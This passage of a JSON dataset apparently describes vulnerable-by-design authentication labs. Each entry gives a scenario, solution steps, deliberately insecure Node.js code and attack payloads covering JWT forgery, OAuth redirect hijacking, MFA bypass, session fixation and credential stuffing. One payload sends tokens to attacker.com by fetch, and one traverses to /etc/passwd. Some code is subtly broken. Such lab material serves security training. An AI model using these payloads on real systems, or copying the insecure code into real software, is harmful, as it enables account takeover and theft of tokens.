      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhYWCJ9fQ.eyJyb2xlIjoiYWRtaW4ifQ.SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure redirect_uri wildcards",
    "Lab Description": "The OAuth implementation accepts overly permissive redirect_uri values containing wildcards, allowing token interception. The application fails to properly validate redirect URLs against registered patterns. To solve: steal authorization codes by registering malicious callback endpoint matching wildcard pattern.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth client registration endpoint using OWASP ZAP",
      "Register client with redirect_uri containing * wildcard",
      "Initiate auth flow with attacker-controlled subdomain",
      "Intercept authorization code in redirect",
      "Exchange code for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const clients = {};app.post('/register', (req, res) => {const clientId = Math.random().toString(36);clients[clientId] = {redirect_uri: req.body.redirect_uri};res.json({clientId});});app.get('/auth', (req, res) => {const client = clients[req.query.client_id];if (req.query.redirect_uri.startsWith(client.redirect_uri.replace('*',''))) {res.redirect(`${req.query.redirect_uri}?code=AUTH_CODE`);} else {res.status(400).send('Invalid redirect');}});app.listen(3000);",
    "payloads": [
      "{\"redirect_uri\":\"https://*.attacker.com/callback\"}",
      "/auth?client_id=CLIENT_ID&redirect_uri=https://evil.attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header compression",
    "Lab Description": "The application assigns session IDs based on HTTP/2 header values that can be manipulated through compression contexts. The server fails to reset compression contexts between connections. To solve: fixate session ID by manipulating HPACK header compression state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish multiple HTTP/2 connections using Burp Suite",
      "Analyze session assignment patterns",
      "Craft requests that manipulate HPACK state",
      "Fixate predictable session ID",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({key: fs.readFileSync('key.pem'),cert: fs.readFileSync('cert.pem')});const sessions = {};server.on('stream', (stream, headers) => {const sessionId = headers['x-custom-header'] || Math.random().toString(36);sessions[sessionId] = headers;stream.respond({'content-type': 'text/html'});stream.end(`Session ${sessionId}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/2\r\nHost: vulnerable.com\r\nx-custom-header: FIXATED_ID\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter reflection",
    "Lab Description": "The multi-factor authentication flow reflects unvalidated state parameters in successful responses. The application fails to maintain server-side state validation. To solve: bypass MFA by injecting arbitrary state parameters that get reflected back after verification.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Modify state parameter to admin=true",
      "Complete MFA verification normally",
      "Capture reflected state in success response",
      "Access privileged functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/mfa/start', (req, res) => {res.cookie('mfa_state', req.query.state || 'user');res.send('Verification required');});app.post('/mfa/verify', (req, res) => {const state = req.cookies.mfa_state;res.json({status: 'verified', state});});app.listen(3000);",
    "payloads": [
      "/mfa/start?state=admin",
      "{\"status\":\"verified\",\"state\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password hash timing leak",
    "Lab Description": "The authentication system leaks valid usernames through password hash comparison timing differences. The application uses insecure string comparison for password hashes. To solve: enumerate valid users via timing attacks then perform targeted credential stuffing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Measure response times for login attempts using OWASP ZAP",
      "Identify username candidates showing timing variations",
      "Perform statistical analysis of response times",
      "Confirm valid users through timing patterns",
      "Execute targeted password attacks"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const crypto = require('crypto');const app = express();const users = {'admin':'5f4dcc3b5aa765d61d8327deb882cf99'};app.post('/login', (req, res) => {const user = users[req.body.user];if (!user) return res.status(401).send('Invalid user');const inputHash = crypto.createHash('md5').update(req.body.pass).digest('hex');let match = true;for (let i = 0; i < user.length; i++) {if (user[i] !== inputHash[i]) match = false;}if (match) res.send('Logged in');else res.status(401).send('Invalid pass');});app.listen(3000);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"password\"}",
      "{\"user\":\"guest\",\"pass\":\"password\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via x5u header injection",
    "Lab Description": "The JWT validation endpoint improperly processes x5u header parameters, allowing algorithm confusion attacks. The application fails to validate certificate chain when loading verification keys from URLs. To solve: forge a valid admin token by injecting malicious x5u header pointing to attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Host spoofed X.509 certificate on attacker server",
      "Craft token with x5u header pointing to malicious cert",
      "Sign token with RS256 using corresponding private key",
      "Submit forged token to bypass admin checks"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.post('/verify', async (req, res) => {const token = req.body.token;const header = jwt.decode(token, {complete: true}).header;const key = header.x5u ? (await axios.get(header.x5u)).data : 'SECRET_KEY';jwt.verify(token, key);if (jwt.decode(token).role === 'admin') res.send('Admin access');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQifQ.eyJyb2xlIjoiYWRtaW4ifQ.SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe referrer policy",
    "Lab Description": "The OAuth implementation leaks tokens through insecure iframe referrer policies. The application fails to set proper referrer policies on iframe elements containing sensitive tokens. To solve: exfiltrate OAuth tokens by crafting malicious page that reads iframe document.referrer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Create attacker page with iframe pointing to OAuth endpoint",
      "Exploit missing referrer policy to read token from referrer header",
      "Capture token when victim visits malicious page",
      "Use stolen token to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.send(`<script>window.location='https://vulnerable.com/callback?token=SECRET'</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://vulnerable.com/oauth/iframe\" id=\"leak\"></iframe><script>setTimeout(()=>alert(document.getElementById('leak').contentDocument.referrer),1000)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport protocol",
    "Lab Description": "The application establishes sessions through WebTransport connections before authentication. The WebTransport handshake accepts attacker-provided session identifiers. To solve: fixate session ID during WebTransport connection then authenticate to hijack the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport handshake with specialized proxy",
      "Inject custom Session-ID header during connection",
      "Complete authentication through normal HTTP flow",
      "Reuse WebTransport session in authenticated context",
      "Verify session persistence across protocols"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');const server = new WebTransport({ port: 443 });const sessions = {};server.on('session', (session) => {const sessionId = session.headers['session-id'];session.socket = sessions[sessionId] || {};});",
    "payloads": [
      "CONNECT / HTTP/3\r\nHost: vulnerable.com\r\nSession-ID: FIXATED_ID\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via biometric replay",
    "Lab Description": "The multi-factor authentication system accepts replayed biometric verification data. The application fails to implement proper anti-replay protections for biometric authentication. To solve: intercept valid biometric data during authentication and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture biometric authentication data with MITM proxy",
      "Analyze biometric data format and parameters",
      "Replay captured biometric data in new session",
      "Bypass MFA requirement with replayed data",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const biometricData = [];app.post('/verify-biometric', (req, res) => {biometricData.push(req.body.data);if (biometricData.includes(req.body.data)) res.json({verified:true});else res.status(403).json({error:'Verification failed'});});app.listen(3000);",
    "payloads": [
      "{\"data\":\"BASE64_BIOMETRIC_SAMPLE\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP/3 connection reuse",
    "Lab Description": "The authentication system improperly reuses HTTP/3 connections for different users. The application fails to properly isolate connection contexts between authentication attempts. To solve: perform credential stuffing by reusing established HTTP/3 connection across multiple authentication attempts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/3 connection to target using specialized client",
      "Perform legitimate login to establish connection state",
      "Reuse same connection for credential stuffing attempts",
      "Bypass rate limits through connection persistence",
      "Identify successful authentication responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('http3');const server = http3.createServer();const connections = new Map();server.on('stream', (stream) => {const connId = stream.session.id;if (!connections.has(connId)) connections.set(connId, {auth: false});const state = connections.get(connId);if (stream.headers[':path'] === '/login') {state.auth = (stream.headers['password'] === 'correct');}if (state.auth) stream.respond({':status': 200});else stream.respond({':status': 401});});server.listen(443);",
    "payloads": [
      "GET /login HTTP/3\r\nHost: vulnerable.com\r\npassword: guess1\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API",
    "Lab Description": "The lab's authentication system uses JSON Web Tokens with improper signature validation. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge a valid JWT for the admin user by exploiting this vulnerability.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid user session request with Burp Suite to capture a sample JWT",
      "Decode the JWT using jwt.io and observe the structure and claims",
      "Modify the algorithm header to 'none' and change the username claim to 'admin'",
      "Remove the signature portion of the JWT (after the second dot)",
      "Submit the modified token in an authorization header to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();const users = {'user1':'pass123','admin':'admin123'};app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]&&users[username]===password){const token=jwt.sign({user:username},'weaksecret',{algorithm:'HS256'});res.json({token});}else{res.status(401).send('Invalid credentials');}});app.get('/admin',(req,res)=>{try{const token=req.headers.authorization.split(' ')[1];const decoded=jwt.decode(token,{complete:true});if(decoded.header.alg==='none'){const user=decoded.payload.user;if(user==='admin'){res.send('Admin access granted');}}}catch(e){res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "GraphQL query depth exploitation",
    "Lab Description": "The GraphQL endpoint lacks proper depth limiting controls, allowing recursive queries that can lead to denial of service or data leakage. The application processes nested queries without restrictions. To solve: craft a recursive query to extract all user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send introspection queries to identify available schema types",
      "Discover user-related types and their relationships using __schema queries",
      "Construct a deeply nested query that recursively follows user relationships",
      "Use query batching to send multiple recursive queries in parallel",
      "Extract sensitive user data from the responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type User { id: ID! username: String! friends: [User] }type Query { getUser(id: ID!): User }`);const root = {getUser: ({id}) => db.getUser(id)};const app = express();app.use('/graphql', graphqlHTTP({schema,rootValue: root,graphiql: true}));app.listen(4000);",
    "payloads": [
      "query { getUser(id: \"1\") { username friends { username friends { username friends { username } } } }",
      "query { __schema { types { name fields { name type { name } } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The OAuth implementation has an open redirect vulnerability in the callback URL validation. The application fails to properly validate redirect URIs during token exchange. To solve: steal an OAuth token by crafting a malicious redirect URI and use it to authenticate as another user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite to identify callback parameters",
      "Modify the redirect_uri parameter to point to an attacker-controlled domain",
      "Trick a user into initiating OAuth with the malicious redirect URI",
      "Capture the authorization code or token from the redirect",
      "Exchange the code for an access token and authenticate as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const clients = {'client1':{secret:'sec123',redirectURIs:['https://client1.com/callback']}};app.get('/oauth/authorize',(req,res)=>{const{client_id,redirect_uri}=req.query;if(clients[client_id]){res.redirect(`${redirect_uri}?code=rand123`);}});app.post('/oauth/token',(req,res)=>{const{client_id,client_secret,code}=req.body;if(clients[client_id]&&clients[client_id].secret===client_secret){res.json({access_token:'token123'});}});app.listen(3000);",
    "payloads": [
      "https://oauth-provider.com/oauth/authorize?client_id=client1&redirect_uri=https://attacker.com",
      "https://oauth-provider.com/oauth/authorize?client_id=client1&redirect_uri=https://client1.com.evil.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via JWT in URL fragment",
    "Lab Description": "The application sets JWT tokens from URL fragments without proper validation, allowing session fixation attacks. The vulnerable endpoint accepts tokens from untrusted sources. To solve: craft a URL with a fixed session token and trick a user into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Generate a valid JWT token with a long expiration time",
      "Craft a URL containing the token in the fragment identifier",
      "Use social engineering to make the victim visit the URL while logged in",
      "The application will adopt the attacker's token as the session identifier",
      "Access the victim's session using the pre-set token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = {'user1':'pass123'};app.get('/auth',(req,res)=>{const token = req.url.split('#')[1];if(token){req.session.token = token;res.redirect('/');}});app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]===password){const token = jwt.sign({user:username},'secret');res.json({redirect:`/auth#${token}`});}});app.listen(3000);",
    "payloads": [
      "http://vulnerable.com/auth#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjEifQ.wTxqWLZLu7J6Ks7dYq7WgV9uY6JkQz7K1kZ8x6vY7dI",
      "http://vulnerable.com/auth#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow relies on client-side status parameters that can be manipulated. The application fails to verify MFA completion server-side before granting access. To solve: bypass MFA by modifying the authentication status parameter after initial login.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in with valid credentials using Burp Suite to intercept requests",
      "Observe the MFA verification request/response flow",
      "Identify the status parameter that indicates MFA completion",
      "Modify the status parameter before final submission",
      "Resend the request with status set to 'verified' to bypass MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());const users = {'user1':{password:'pass123',mfaSecret:'MFA123'}};app.post('/verify-mfa',(req,res)=>{const{username,code,status}=req.body;if(status==='verified'||(users[username]&&code===users[username].mfaSecret)){res.json({access_token:'token123'});}});app.listen(3000);",
    "payloads": [
      "{\"username\":\"user1\",\"code\":\"123456\",\"status\":\"pending\"}",
      "{\"username\":\"user1\",\"status\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice architecture",
    "Lab Description": "The JWT validation service improperly processes the kid header, allowing path traversal to load arbitrary verification keys. The application trusts unsigned tokens when key loading fails. To solve: forge a valid admin token by forcing the system to use a predictable key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the kid header value",
      "Modify the kid header to traverse directories (../../../../etc/passwd)",
      "Observe the server error revealing the filesystem structure",
      "Craft a token with kid pointing to a predictable key location",
      "Sign the forged token with the discovered key and access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.verify(token,(header,callback)=>{fs.readFile(`/keys/${header.kid}`,(err,key)=>{callback(null,err?'weaksecret':key);});});if(decoded.role==='admin')res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiLCJ0eXAiOiJKV1QifQ.eyJyb2xlIjoidXNlciJ9.1yBq9M7hU0QqJ8w4jK9nX8zK1vY5rA7sC2dE3fG4hI",
      "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL2tleXMvcHVibGljLmtleSIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.Kq4l5K8jN2m3P6o9R1sT4uV7wX0yZ2A1B3C5D7E8F"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF with JSONP callback",
    "Lab Description": "The OAuth implementation accepts state parameters via JSONP callbacks, enabling CSRF attacks. The application fails to validate the state parameter origin during token exchange. To solve: craft a malicious site that steals OAuth tokens via automatic callback execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the OAuth flow using OWASP ZAP's forced browsing",
      "Note the JSONP callback parameter in the redirect URI",
      "Create an HTML page with malicious state parameter",
      "Embed the page with auto-executing callback script",
      "Trick an admin into visiting the page to capture their token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{state,code}=req.query;if(/^[a-z0-9]+$/i.test(state)){res.send(`<script>window.opener.postMessage({'state':'${state}','token':'${code}'},'*')</script>`);}else{res.json({access_token:'generated_token'});}});app.listen(3000);",
    "payloads": [
      "https://oauth-provider.com/auth?client_id=123&redirect_uri=attacker.com/cb&state=<script>alert(1)</script>",
      "https://oauth-provider.com/auth?client_id=123&redirect_uri=attacker.com/cb&state=malicious&response_type=token"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The WebSocket connection handshake accepts arbitrary session identifiers, allowing session fixation attacks. The application reuses HTTP session tokens for WebSocket authentication without regeneration. To solve: establish a WebSocket connection with a fixed session ID and trick a user into adopting it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to establish a WebSocket connection",
      "Note the Session-ID header in the handshake request",
      "Craft a malicious link with a fixed session ID",
      "Force the victim to connect using your session ID",
      "Monitor the WebSocket channel for sensitive data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.use((req,res,next)=>{if(!req.cookies.session)res.cookie('session',require('crypto').randomBytes(16).toString('hex'));next();});const server = app.listen(3000);server.on('upgrade',(req,socket,head)=>{wss.handleUpgrade(req,socket,head,(ws)=>{ws.session=req.headers['session-id']||req.cookies.session;wss.emit('connection',ws,req);});});wss.on('connection',(ws)=>{ws.send(`Connected as ${ws.session}`);});",
    "payloads": [
      "wss://vulnerable.com/chat?session_id=fixed-session-123",
      "https://vulnerable.com/ws-handshake?session_id=fixed-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition",
    "Lab Description": "The multi-factor authentication endpoint is vulnerable to race conditions during verification state checks. The application uses non-atomic operations to update MFA status. To solve: send parallel verification requests to bypass MFA before the state is finalized.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the MFA verification request with Burp Suite",
      "Send the request to Turbo Intruder",
      "Configure 50 parallel requests with 1ms delay",
      "Monitor for successful bypass responses",
      "Reuse the session from successful responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let mfaStatus = {};app.post('/verify-mfa',(req,res)=>{const{user,token}=req.body;if(!mfaStatus[user])mfaStatus[user]={verified:false};if(token==='123456'){setTimeout(()=>{mfaStatus[user].verified=true;},1000);}if(mfaStatus[user].verified)res.json({access:'granted'});else res.status(403).send('Denied');});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\",\"token\":\"123456\"}",
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\",\"token\":\"111111\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL batch queries",
    "Lab Description": "The GraphQL endpoint allows unlimited batch authentication attempts in a single request. The application fails to implement rate limiting on batched operations. To solve: craft a batch query testing 100+ credential pairs against the login mutation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using OWASP ZAP",
      "Capture a valid login mutation with Postman",
      "Construct a batch query with 100+ credential variations",
      "Use parallel requests to maximize attempt rate",
      "Identify successful logins from response variations"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='Admin123!'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login1:login(username:\\\"admin\\\",password:\\\"password1\\\") login2:login(username:\\\"admin\\\",password:\\\"password2\\\")}\"}",
      "{\"query\":\"mutation {logins:batchLogin(creds:[{user:\\\"admin\\\",pass:\\\"Admin123!\\\"}])}\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation endpoint improperly trusts the jku header to fetch verification keys from external domains. The application fails to validate the jku domain against an allowlist. To solve: host a malicious JWKS file and forge admin tokens by injecting your jku endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the jku header absence",
      "Set up a web server hosting a crafted JWKS file with your public key",
      "Forge a token with jku pointing to your server and admin claims",
      "Sign the token with your private key matching the JWKS file",
      "Submit the token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.verify(token,async (header,callback)=>{try{const jwks = await axios.get(header.jku);const key = jwks.data.keys.find(k=>k.kid===header.kid);callback(null,key?key.x5c[0]:'invalid');}catch(e){callback(null,'invalid');}});if(decoded.role==='admin')res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vandrcyIsImtpZCI6IjEyMyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.INVALID_SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth callback page embeds user-sensitive tokens in URL fragments while having overly permissive CSP headers. The application fails to strip tokens from history.pushState calls. To solve: craft a malicious page that exfiltrates tokens via CSP-bypassed iframe techniques.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with OWASP ZAP to identify token leakage",
      "Note the CSP headers allowing unsafe-inline scripts",
      "Create an HTML page with history manipulation scripts",
      "Embed the OAuth callback URL in a hidden iframe",
      "Capture tokens via postMessage event listeners"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use((req,res,next)=>{res.set('Content-Security-Policy',\"script-src 'self' 'unsafe-inline'\");next();});app.get('/oauth/callback',(req,res)=>{const token = req.url.split('#')[1];res.send(`<script>window.opener.postMessage({token:'${token}'},'*');history.pushState({},'','/callback#${token}')</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://oauth-victim.com/callback#leaked-token\"></iframe>",
      "<script>window.addEventListener('message',(e)=>{fetch('https://attacker.com/?token='+e.data.token)})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers",
    "Lab Description": "The application processes session identifiers from HTTP/2 trailer headers after main headers, allowing session fixation. The server fails to validate trailer header timing. To solve: craft HTTP/2 requests with malicious session IDs in trailers to override legitimate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid session request with Burp Suite HTTP/2 plugin",
      "Modify the request to include session trailer headers",
      "Use custom tooling to send headers after main request",
      "Verify session override via subsequent authenticated requests",
      "Maintain access with the fixed session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});let sessions = {};server.on('stream',(stream,headers)=>{let sessionId = headers['session-id'];stream.on('trailers',(trailers)=>{sessionId = trailers['session-id']||sessionId;});if(!sessions[sessionId])sessions[sessionId]={authenticated:false};stream.respond({'content-type':'text/html'});stream.end(`Session ${sessionId}: ${sessions[sessionId].authenticated?'Authenticated':'Anonymous'}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/2\nHost: victim.com\nsession-id: legit-id\n\ntrailers: session-id\nsession-id: malicious-id\n\n",
      "POST /login HTTP/2\nHost: victim.com\n\ntrailers: session-id\nsession-id: fixed-session-123\n\nusername=admin&password=admin123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebAuthn replay",
    "Lab Description": "The WebAuthn implementation fails to properly validate challenge nonces, allowing authentication replay attacks. The server accepts previously used assertion signatures. To solve: intercept a valid WebAuthn assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful WebAuthn authentication with Burp Suite",
      "Save the authenticatorData, clientDataJSON, and signature",
      "Replay the assertion with identical values",
      "Bypass MFA by submitting the replayed assertion",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let challenges = {};app.post('/webauthn/auth',(req,res)=>{const{id,rawId,response}=req.body;if(response.authenticatorData&&response.clientDataJSON&&response.signature){res.json({status:'ok',token:'authenticated'});}else{res.status(403).json({error:'Invalid assertion'});}});app.listen(3000);",
    "payloads": [
      "{\"id\":\"ABCD\",\"rawId\":\"ABCD\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJjcm9zc09yaWdpbiI6ZmFsc2V9\",\"signature\":\"MEUCIQ...\"}}",
      "{\"id\":\"1234\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAifQ\",\"signature\":\"MEQCIF...\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL aliases",
    "Lab Description": "The GraphQL endpoint allows unlimited authentication attempts using query aliases in a single request. The application fails to rate limit aliased operations. To solve: craft a single query with 100+ aliased login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with aliased login attempts for each pair",
      "Identify successful logins from the batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='p@ssw0rd'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {attempt1:login(username:\\\"admin\\\",password:\\\"password1\\\") attempt2:login(username:\\\"admin\\\",password:\\\"password2\\\")}\"}",
      "{\"query\":\"mutation {login1:login(username:\\\"user1\\\",password:\\\"pass1\\\") login2:login(username:\\\"user2\\\",password:\\\"pass2\\\") ...login100:login(username:\\\"user100\\\",password:\\\"pass100\\\")}\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via nested JSON parser",
    "Lab Description": "The JWT validation service improperly processes nested JSON structures in token claims, allowing signature verification bypass. The application fails to validate the complete token structure when encountering nested objects. To solve: craft a JWT with nested claims that bypasses signature verification while maintaining admin privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and decode its structure",
      "Identify the claim used for privilege assignment (e.g., 'role')",
      "Construct a nested JSON object within the claims: {'role':{'admin':true}}",
      "Strip the signature portion while maintaining valid JWT format",
      "Submit the modified token to gain admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.decode(token,{json:true});if(decoded?.role?.admin||decoded.role==='admin'){res.send('Admin access granted');}else{res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
